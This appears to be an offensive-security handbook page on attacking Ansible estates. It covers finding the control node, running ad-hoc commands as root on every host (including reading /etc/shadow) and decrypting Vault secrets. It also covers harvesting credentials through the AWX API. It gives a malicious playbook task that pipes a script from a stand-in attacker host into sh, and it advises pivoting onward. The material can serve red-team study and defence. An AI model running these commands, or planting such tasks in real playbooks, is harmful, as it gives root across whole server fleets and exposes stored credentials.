---
title: "Ansible: abusing the control node and AWX for estate-wide code execution"
description: "Attacking Ansible: compromising the control node to run modules as root across the whole inventory over SSH, decrypting Ansible Vault secrets and reading plaintext connection credentials, injecting into playbooks and roles in the control repository, and abusing AWX/Tower stored credentials and job templates."
keywords:
  - Ansible
  - ansible control node
  - ansible vault
  - AWX
  - Tower
---

# Ansible

Ansible is agentless: a control node connects to each inventory host over SSH (or WinRM) and runs modules there as the connecting user, escalating with `become` to root. Whoever controls the control node, or the playbooks it runs, or the credentials it holds, therefore has code execution as root across every managed host. There is no agent to compromise; the leverage is the control node and the secrets around it.

## Find the control node and its inventory

```bash
which ansible ansible-playbook                      # control-node binaries
ls -la /etc/ansible/ ~/.ansible/ ./ansible.cfg      # config, inventory, roles
grep -rniE 'ansible_(ssh_)?pass|ansible_user|become_pass|vault_password_file' . /etc/ansible 2>/dev/null
```

`ansible.cfg` names the inventory, the `vault_password_file`, and `private_key_file`; the inventory often carries connection credentials in the clear.

## Run commands across the estate

With the control node's SSH keys and inventory, a single ad-hoc command runs everywhere as root:

```bash
ansible all -i inventory -m command -a 'id' --become   # root on every reachable host
ansible all -i inventory -m shell -a 'cat /etc/shadow' -b
```

The SSH private keys the control node uses to reach hosts (`~/.ssh/`, the `private_key_file`) are themselves lateral-movement material even without Ansible.

## Decrypt Vault secrets and read plaintext credentials

Ansible Vault encrypts secret files, but the vault password is frequently stored on disk or in a CI variable, and `ansible.cfg` points right at it:

```bash
grep vault_password_file ansible.cfg                 # path to the key that decrypts everything
ansible-vault view group_vars/all/secrets.yml --vault-password-file .vault_pass
```

Inventories and `group_vars`/`host_vars` also hold `ansible_password`, `ansible_ssh_pass`, and `ansible_become_password` in plaintext when Vault was not used, which are directly reusable credentials.

## Inject into playbooks and roles

Playbooks and roles are code, usually in a Git repository that the control node or a CI job runs on a schedule. A task added to a playbook, a role, or a pulled Galaxy/`requirements.yml` dependency runs wherever that play targets:

```yaml
- hosts: all
  become: true
  tasks:
    - name: x
      command: /bin/sh -c "curl -s https://attacker/a | sh"
```

Write access to the control repository is estate-wide code execution at the next run; see [versioning](../versioning/git/hooks-and-config-execution.md) for turning repository access into that write.

## AWX and Tower

AWX (and its commercial Tower/Controller build) is the web platform around Ansible. It stores machine, vault, and cloud **credentials** encrypted with the instance `SECRET_KEY`, and its **job templates** run arbitrary playbooks against inventories on demand or on a schedule.

```bash
# API with a stolen token: list credentials and launch a job template
curl -sk -H "Authorization: Bearer $TOKEN" https://awx/api/v2/credentials/ | jq '.results[].name'
curl -sk -H "Authorization: Bearer $TOKEN" -X POST https://awx/api/v2/job_templates/<id>/launch/
```

An admin session (default `admin` credentials, SSO gaps, or a leaked token) lets you launch a template, add a malicious one, or use a stored credential inside a job that prints or exfiltrates it; the API never returns the secret values directly. A foothold on the AWX host with the database and `SECRET_KEY` decrypts every stored credential offline. Either way the payoff is code execution on the templates' target hosts with their stored credentials.

## Follow-on

The control node yields root on every managed host at once, and the harvested SSH keys, Vault secrets, and AWX credentials extend that to systems Ansible does not even manage. From there, pivot into the directory and cloud accounts those credentials unlock.

## Tools

- `ansible`, `ansible-vault`: run ad-hoc commands and decrypt Vault files with the recovered key.
- `jq` with the AWX REST API for credential and job-template enumeration.

## References

- [Ansible become (privilege escalation)](https://docs.ansible.com/ansible/latest/playbook_guide/become.html)
- [Ansible Vault](https://docs.ansible.com/ansible/latest/vault_guide/index.html)
- [AWX REST API](https://ansible.readthedocs.io/projects/awx/en/latest/rest_api/index.html)
